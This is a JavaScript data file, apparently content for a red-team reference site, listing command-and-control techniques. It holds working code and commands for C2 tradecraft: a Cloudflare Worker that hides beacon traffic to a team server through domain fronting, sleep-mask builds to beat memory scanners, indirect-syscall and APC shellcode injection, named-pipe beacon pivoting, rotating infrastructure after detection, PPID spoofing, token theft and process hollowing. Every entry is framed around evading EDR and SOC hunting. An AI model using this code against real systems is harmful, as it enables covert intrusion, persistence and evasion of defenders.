export const c2AdvancedTechniques = [
  {
    id: 'c2-domain-fronting',
    title: 'Domain Fronting & CDN-Based C2 Concealment',
    subtitle: 'Route beacon traffic through CDN edge nodes so C2 callbacks appear to come from trusted CDN domains',
    tags: ['domain fronting', 'CDN fronting', 'Cloudflare', 'Azure Front Door', 'Host header', 'SNI', 'HTTPS C2', 'traffic hiding'],
    accentColor: 'cyan',
    overview: 'Domain fronting abuses the split between the TLS SNI field (seen by network monitors) and the HTTP Host header (seen by the CDN). The TLS handshake names a legitimate CDN domain, so TLS inspection and DNS-based firewalls see only that domain. The HTTP Host header inside the encrypted tunnel routes the request to the actual team server via the CDN. Not all CDNs permit this — Azure Front Door and Cloudflare Workers are the most reliable targets currently.',
    steps: [
      'Register a "front domain" on the same CDN as the team server — any domain on the same CDN edge will front for another',
      'Set Cobalt Strike listener to use the CDN Worker/Azure Front Door URL as the callback domain',
      'In the Malleable C2 profile, set the http-get/http-post host header to the Worker URL',
      'Configure the CDN worker/route to proxy requests matching the C2 URIs to the team server IP',
      'Beacon SNI in TLS = legitimate CDN hostname; Host header in HTTP = Worker URL → team server',
      'Test with curl --resolve and check that a Cloudflare IP appears in netflow, not the team server IP',
    ],
    commands: [
      {
        title: 'Cloudflare Workers C2 proxy',
        code: `// Cloudflare Worker — proxy C2 traffic to team server
// Deploy at: workers.cloudflare.com → Create Worker

export default {
  async fetch(request) {
    const TEAMSERVER = "https://TEAMSERVER_IP";
    const C2_PATHS   = ["/api/v1/users", "/update", "/cdn-status"];

    const url = new URL(request.url);
    if (!C2_PATHS.some(p => url.pathname.startsWith(p))) {
      return Response.redirect("https://microsoft.com", 302);
    }

    const newUrl = TEAMSERVER + url.pathname + url.search;
    const newReq = new Request(newUrl, {
      method:  request.method,
      headers: request.headers,
      body:    request.body,
    });
    return fetch(newReq, { cf: { tlsClientAuth: false } });
  }
};

# Test fronting — SNI is Cloudflare, backend routes to Worker
curl -v --resolve yourdomain.com:443:104.21.0.0 \\
  https://yourdomain.com/api/v1/users \\
  -H "Host: YOUR_WORKER.workers.dev"
# Should see Cloudflare cert + C2 response`
      },
      {
        title: 'Azure Front Door C2 fronting',
        code: `# Azure Front Door setup
# 1. Create AFD profile → Add endpoint → Add origin (team server IP)
# 2. Add route: match path pattern /api/* → forward to origin
# 3. Front domain: <yourname>.azurefd.net

# CS Listener — use AFD endpoint as callback host
# Malleable profile http-get/post:
#   header "Host" "YOUR_WORKER.azurefd.net";

# Confirm fronting — TLS handshake shows AFD cert
openssl s_client -connect YOUR_AFD_ENDPOINT.azurefd.net:443 -servername microsoft.com
# Note: SNI = microsoft.com, cert = AFD → fronted

# Verify beacon sees AFD IP in netflow, not team server
nslookup YOUR_AFD_ENDPOINT.azurefd.net
# Returns AFD edge IP — not team server IP`
      }
    ]
  },
  {
    id: 'c2-sleep-masking',
    title: 'Sleep Masking — In-Memory Beacon Encryption',
    subtitle: 'Encrypt the beacon in memory during sleep intervals to defeat memory scanners and forensic analysis',
    tags: ['sleep masking', 'Ekko', 'Foliage', 'EKKO BOF', 'ROP sleep', 'memory encryption', 'beacon obfuscation', 'Cobalt Strike'],
    accentColor: 'cyan',
    overview: 'Modern EDRs periodically scan process memory for shellcode signatures even when the beacon is idle. Sleep masking encrypts the entire beacon image (reflective loader, config, and shellcode) in memory during sleep, and decrypts it just before waking. Ekko uses a ROP chain and Windows timer queues to flip memory permissions and XOR-encrypt the beacon without ever calling VirtualProtect directly from beacon context. Foliage provides a modular alternative with AES encryption and indirect syscalls.',
    steps: [
      'Understand the sleep mask chain: beacon calls SleepMaskKit callback → memory is encrypted → Sleep() → memory decrypted → beacon resumes',
      'Build the Ekko BOF: clone the Ekko repo, compile with MinGW, then load via Script Manager in CS',
      'Alternatively: enable the built-in sleep mask in the Malleable C2 profile post-ex block (CS 4.5+)',
      'Foliage: provides AES-128 CBC encryption + syscall obfuscation — drops no readable strings in memory',
      'Verify the mask is working: run volatility/moneta against the sleeping beacon process — no shellcode signatures should match',
      'Combine with spawnto and PPID spoofing — sleep masking only protects idle memory, not active execution',
    ],
    commands: [
      {
        title: 'Ekko sleep mask — compile and load',
        code: `# Clone and compile Ekko
git clone https://github.com/Cracked5pider/Ekko
cd Ekko

# Build BOF (requires MinGW)
x86_64-w64-mingw32-gcc -o Ekko.o -c Ekko.c -masm=intel -Wall

# In Cobalt Strike beacon:
inline-execute /tools/Ekko.o

# === CS 4.5+ built-in sleep mask (Malleable C2 profile) ===
stage {
    set sleep_mask "true";
    set userwx     "false";    # Never RWX — allocate RW, flip to RX
}

# Foliage — AES sleep masking BOF
git clone https://github.com/SecIdiot/FOLIAGE
cd FOLIAGE && make
inline-execute /tools/FOLIAGE/foliage.o`
      },
      {
        title: 'Memory scan validation — confirm no beacon signature',
        code: `# Moneta (Windows) — scan for suspicious memory regions
# Run against beacon PID while beacon is sleeping
moneta64.exe -s -p <PID>
# With sleep mask: no RWX regions, no shellcode IOCs

# PE-sieve — in-process PE anomaly detection
pe-sieve64.exe /pid <PID> /quiet
# Masked beacon: no detected PE anomalies

# Volatility malfind — offline memory analysis
python3 vol.py -f memory.raw --profile=Win10x64 malfind --pid <PID>
# Masked beacon during sleep: malfind returns no results

# Timeline: sleep mask ON → EDR memory scan fires → no IOC found → beacon wakes → executes`
      }
    ]
  },
  {
    id: 'c2-process-injection-opsec',
    title: 'OPSEC-Safe Process Injection — Indirect Syscalls & APC Injection',
    subtitle: 'Inject shellcode using indirect syscalls and APC queues to bypass NTDLL hook telemetry',
    tags: ['indirect syscalls', 'HellsGate', 'HalosGate', 'SysWhispers3', 'APC injection', 'NtQueueApcThread', 'ETW bypass', 'OPSEC injection'],
    accentColor: 'cyan',
    overview: 'Standard injection uses NtWriteVirtualMemory + NtCreateThreadEx which EDRs hook in NTDLL userland. Direct syscalls bypass hooks but are detectable by checking if the syscall instruction is in NTDLL address range. Indirect syscalls use a trampoline inside NTDLL to execute the syscall — the CPU context at syscall time places the return address inside NTDLL, bypassing this detection. APC injection (NtQueueApcThread) is alertable-thread-based and leaves no CreateRemoteThread telemetry.',
    steps: [
      'SysWhispers3: generates SSN (syscall stub numbers) at compile time — no runtime NTDLL parsing needed',
      'HellsGate: reads SSNs from NTDLL on disk, builds dynamic stubs at runtime — evades static analysis',
      'HalosGate: extends HellsGate by parsing neighboring stubs when the target is hooked',
      'Indirect syscall: place a gadget pointer into NTDLL .text — syscall executes from NTDLL address range',
      'APC injection target: find a thread in alertable wait state (WaitForSingleObjectEx with alertable=TRUE)',
      'Queue shellcode via NtQueueApcThread(alertable_thread, shellcode_addr, ...) — executes on next alertable wait',
    ],
    commands: [
      {
        title: 'SysWhispers3 indirect syscall injection',
        code: `# Generate SysWhispers3 stubs (compile-time SSNs, indirect mode)
python3 syswhispers.py \\
  --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx \\
  --out-file syscalls \\
  --arch x64 \\
  --compiler msvc \\
  --method indirect
# Outputs: syscalls.h, syscalls.c, syscallsstubs.asm

// Use in loader:
// #include "syscalls.h"
// SW3_GetSyscallAddress("NtAllocateVirtualMemory"); // resolves gadget in NTDLL

// Allocate RW
HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
NtAllocateVirtualMemory(proc, &base, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

// Write shellcode
NtWriteVirtualMemory(proc, base, shellcode, shellcode_len, NULL);

// Flip to RX
NtProtectVirtualMemory(proc, &base, &size, PAGE_EXECUTE_READ, &old_prot);

// Create remote thread via indirect syscall (no CreateRemoteThread IAT entry)
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, proc,
    base, NULL, FALSE, 0, 0, 0, NULL);`
      },
      {
        title: 'APC queue injection — no new thread creation',
        code: `// APC injection — queue shellcode to an alertable thread
// No NtCreateThreadEx / CreateRemoteThread telemetry

#include <windows.h>
#include <tlhelp32.h>

DWORD find_alertable_thread(DWORD pid) {
    // Enumerate threads of target process
    // Look for threads in WaitForSingleObjectEx (alertable wait)
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {sizeof(te)};
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(hSnap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return 0;
}

void inject_via_apc(DWORD pid, BYTE* shellcode, SIZE_T len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate RW, write, flip RX
    LPVOID mem = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, mem, shellcode, len, NULL);
    DWORD old;
    VirtualProtectEx(hProc, mem, len, PAGE_EXECUTE_READ, &old);

    // Queue APC to alertable thread
    DWORD tid = find_alertable_thread(pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    QueueUserAPC((PAPCFUNC)mem, hThread, 0);
    // Executes when thread enters alertable wait (e.g. Sleep, WaitForSingleObjectEx)

    CloseHandle(hThread);
    CloseHandle(hProc);
}`
      }
    ]
  },
  {
    id: 'c2-named-pipe-comms',
    title: 'Named Pipe C2 — Peer-to-Peer Internal Pivoting',
    subtitle: 'Chain beacons over named pipes for lateral movement without new outbound internet connections',
    tags: ['named pipes', 'SMB beacon', 'peer-to-peer', 'pivot', 'bind beacon', 'internal C2', 'link command'],
    accentColor: 'blue',
    overview: 'Named pipe beacons create a parent-child C2 chain entirely over SMB within the target network. The parent beacon (with internet egress) passes tasks downstream via the pipe — internal hosts never make outbound HTTPS connections. This is OPSEC-critical for environments that proxy all internet traffic: only one host needs external egress; all others communicate internally. Pipe names should be customised away from Cobalt Strike defaults (msagent_, postex_).',
    steps: [
      'Create an SMB bind listener in Cobalt Strike: payload = windows/beacon_smb/bind_pipe, custom pipe name',
      'Deliver the SMB beacon payload to the internal target host via existing access',
      'From the parent beacon: link <INTERNAL_HOST> <PIPE_NAME> to connect and receive tasks',
      'All communication flows: operator → parent HTTPS beacon → SMB pipe → child beacon',
      'Customise pipe name in Malleable profile post-ex block: set pipename "mscache_####"',
      'Use TCP bind beacon for environments that restrict pipe access but allow internal TCP',
    ],
    commands: [
      {
        title: 'Named pipe beacon setup and linking',
        code: `# === CS — create SMB bind listener ===
# Listeners → Add
# Payload: windows/beacon_smb/bind_pipe
# Pipe Name: mscache_####     ← customise, avoid defaults
# Note: bind = waits for parent to connect, no outbound connection

# === Generate SMB beacon payload ===
# Payloads → Windows Stageless Generate
# Listener: SMB_Bind
# Output: Raw / EXE / DLL as needed

# === From parent beacon — link to internal child ===
link INTERNAL_HOST.corp.local mscache_1234
# CS will show child beacon connected via parent

# === Alternative — TCP bind beacon ===
# Listeners → Add → windows/beacon_tcp/bind_tcp
# Port: 4444
# From parent: connect INTERNAL_HOST 4444

# === Malleable C2 — customise pipe name ===
post-ex {
    set pipename "mscache_####";   # #### → random digits
}

# Verify chain topology
# CS Beacon console shows: parent → child (SMB) → grandchild (SMB)
# Only parent makes internet HTTPS connections`
      }
    ]
  },
  {
    id: 'c2-infrastructure-rotation',
    title: 'Infrastructure Rotation & Burn Recovery',
    subtitle: 'Rotate burned C2 infrastructure mid-engagement without losing active beacons',
    tags: ['infrastructure rotation', 'burned redirector', 'domain rotation', 'beacon migration', 'fallback listener', 'C2 continuity'],
    accentColor: 'blue',
    overview: 'SOC teams actively hunt C2 infrastructure — a burned redirector or blocked domain must be rotatable in minutes without losing active sessions. The key is maintaining multiple listeners (HTTPS primary, DNS fallback, SMB internal) and having a pre-built rotation process. Beacons should be configured with multiple callback addresses so they automatically fail over when a listener goes down.',
    steps: [
      'Always maintain at minimum: one HTTPS listener (primary), one DNS listener (fallback), one SMB internal pivot listener',
      'Configure Malleable C2 with multiple callback hosts in the http-get/http-post blocks',
      'When a redirector is burned: provision a new redirector VPS → update DNS A record → point to new redirector',
      'DNS TTL should be short (60s) for rapid rotation — set this before the engagement',
      'For beacon migration to a new listener: use the migrate BOF or spawn a new beacon under the existing session',
      'Keep a cold spare team server ready to clone configuration to in case the primary is burned',
    ],
    commands: [
      {
        title: 'Multi-callback Malleable C2 profile',
        code: `# Malleable C2 — multiple callback hosts (Beacon tries each in order)
http-get {
    set uri "/api/v1/users";
    client {
        # Primary redirector
        header "Host" "cdn1.yourdomain.com";
    }
}

# CS Listeners — create both BEFORE engagement
# Listener 1: HTTPS → cdn1.yourdomain.com (primary)
# Listener 2: DNS  → beacon.yourdomain.com (fallback)

# In beacon — configure multiple callback IPs
# Via CS UI: Listeners → Edit → add additional hosts
# Beacon tries each host in order, round-robins on failure

# When primary is burned:
# 1. Provision new VPS: YOUR_NEW_VPS_IP
# 2. Update DNS (short TTL was already set):
#    cdn1.yourdomain.com A → YOUR_NEW_VPS_IP
# 3. Deploy redirector config to new VPS
# 4. Active beacons auto-fail-over to new IP after DNS TTL expires

# DNS TTL — set low before engagement
# At registrar: cdn1.yourdomain.com TTL = 60
# During rotation: change A record → propagates in 60s`
      },
      {
        title: 'Beacon migration to new listener',
        code: `# Spawn a second beacon under an existing session (different listener)
spawn HTTPS-Backup-Listener
# Creates child beacon on backup listener — now have two separate sessions

# Or: spawnto + inject into another process on backup listener
inject <PID> x64 HTTPS-Backup-Listener

# After backup beacon confirms check-in:
# Kill original beacon
kill
# Or let primary beacon die naturally when redirector goes down

# DNS fallback — confirm DNS beacon works BEFORE engagement
# Deploy DNS beacon on one test host and verify DNS C2 traffic

# Infrastructure logging during engagement:
# DATE       | EVENT              | HOST             | ACTION
# 09:15      | Redirector burned  | cdn1.domain.com  | Rotate to cdn2
# 09:16      | DNS updated        | A record changed | New VPS IP
# 09:17      | Beacons reconnect  | All hosts        | Check-in confirmed`
      }
    ]
  },
  {
    id: 'c2-ppid-spoofing',
    title: 'PPID Spoofing, Token Manipulation & Process Hollowing',
    subtitle: 'Masquerade process lineage, inherit privileged tokens, and hollow legitimate processes to hide beacon execution',
    tags: ['PPID spoofing', 'token impersonation', 'process hollowing', 'CreateProcess', 'PROC_THREAD_ATTRIBUTE_PARENT_PROCESS', 'make_token', 'steal_token'],
    accentColor: 'blue',
    overview: 'EDRs correlate processes with their parent for trust decisions. A beacon spawned from cmd.exe → powershell.exe → cmd.exe raises alerts; the same beacon appearing as a child of explorer.exe does not. PPID spoofing uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to assign a fake parent at creation. Token manipulation allows beacons to execute as a different user without spawning a new process. Process hollowing replaces a legitimate process image with shellcode while keeping the legitimate process metadata.',
    steps: [
      'PPID spoofing: open a handle to the desired fake parent process, pass it via UpdateProcThreadAttribute before CreateProcess',
      'In Cobalt Strike: ppid <EXPLORER_PID> sets the PPID for all subsequent fork-and-run tasks from this beacon',
      'make_token: creates a logon session with stolen credentials — beacon tasks run as that user',
      'steal_token <PID>: impersonate the access token of an existing process — ideal for pivoting to SYSTEM or domain admin context',
      'rev2self: revert to original beacon token after task completes',
      'Process hollowing: CreateProcess suspended → NtUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread',
    ],
    commands: [
      {
        title: 'PPID spoofing and token manipulation in Cobalt Strike',
        code: `# === PPID spoofing — make sacrificial processes appear to be children of explorer.exe ===

# Find explorer.exe PID
ps | grep explorer

# Set PPID for this beacon session
ppid <EXPLORER_PID>

# Verify: all subsequent fork-and-run processes appear as children of explorer.exe
# in Sysinternals Process Explorer / event logs

# === Token manipulation ===

# List processes with interesting tokens
ps
# Look for: processes owned by domain admins, SYSTEM, service accounts

# Steal token from process (impersonate that user)
steal_token <PID>

# Create logon session with known credentials
make_token CORP\\domain_admin Password123!

# Verify current identity
getuid

# Revert to original token
rev2self

# === Combined OPSEC checklist ===
# 1. ppid <explorer_pid>          ← fake parent
# 2. steal_token <high_priv_pid>  ← elevated token
# 3. execute task
# 4. rev2self                     ← revert token
# 5. ppid 0                       ← clear PPID`
      },
      {
        title: 'Process hollowing — C implementation',
        code: `// Process hollowing — run shellcode inside a legitimate process image
// CreateProcess(svchost.exe, SUSPENDED) → hollow → inject → resume

STARTUPINFOA si = {sizeof(si)};
PROCESS_INFORMATION pi;

// Create suspended svchost.exe
CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL,
    FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

LPVOID pBase = (LPVOID)((PIMAGE_NT_HEADERS)
    ((BYTE*)GetModuleHandleA(NULL) + ((PIMAGE_DOS_HEADER)GetModuleHandleA(NULL))->e_lfanew))
    ->OptionalHeader.ImageBase;

// Unmap original image from new process
NtUnmapViewOfSection(pi.hProcess, pBase);

// Allocate + write shellcode at same base
LPVOID mem = VirtualAllocEx(pi.hProcess, pBase, shellcode_len,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, mem, shellcode, shellcode_len, NULL);

// Set new entry point in thread context
CONTEXT ctx = {CONTEXT_FULL};
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)mem;  // RCX = entry point on x64
SetThreadContext(pi.hThread, &ctx);

// Resume — process now executes shellcode
ResumeThread(pi.hThread);`
      }
    ]
  },
];